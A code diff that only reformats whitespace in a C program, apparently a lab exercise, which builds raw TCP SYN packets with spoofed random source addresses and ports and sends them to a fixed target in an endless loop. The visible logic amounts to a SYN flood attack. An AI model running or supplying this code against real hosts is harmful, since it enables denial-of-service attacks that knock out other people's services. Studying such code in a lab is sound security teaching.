@@ -24,8 +24,7 @@ void send_raw_ip_packet(struct ipheader *ip)
   int sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
 
   // Step 2: Set socket option.
-  setsockopt(sock, IPPROTO_IP, IP_HDRINCL,
-             &enable, sizeof(enable));
+  setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &enable, sizeof(enable));
 
   // Step 3: Provide needed information about destination.
   dest_info.sin_family = AF_INET;
@@ -44,16 +43,17 @@ int main()
   struct ipheader *ip = (struct ipheader *)buffer;
   struct tcpheader *tcp = (struct tcpheader *)(buffer + sizeof(struct ipheader));
 
-  srand(time(0)); // Initialize the seed for random # generation.
+  srand(time(0));                     // Initialize the seed for random # generation.
+
   while (1)
   {
     memset(buffer, 0, PACKET_LEN);
     // Step 1: Fill in the TCP header.
-    tcp->tcp_sport = rand(); // Use random source port
+    tcp->tcp_sport = rand();          // Use random source port
     tcp->tcp_dport = htons(DEST_PORT);
-    tcp->tcp_seq = rand(); // Use random sequence #
+    tcp->tcp_seq = rand();            // Use random sequence #
     tcp->tcp_offx2 = 0x50;
-    tcp->tcp_flags = TH_SYN; // Enable the SYN bit
+    tcp->tcp_flags = TH_SYN;          // Enable the SYN bit
     tcp->tcp_win = htons(20000);
     tcp->tcp_sum = 0;
 
@@ -63,7 +63,7 @@ int main()
     ip->iph_ttl = 50;                 // Time to live
     ip->iph_sourceip.s_addr = rand(); // Use a random IP address
     ip->iph_destip.s_addr = inet_addr(DEST_IP);
-    ip->iph_protocol = IPPROTO_TCP; // The value is 6.
+    ip->iph_protocol = IPPROTO_TCP;    // The value is 6.
     ip->iph_len = htons(sizeof(struct ipheader) +
                         sizeof(struct tcpheader));
 
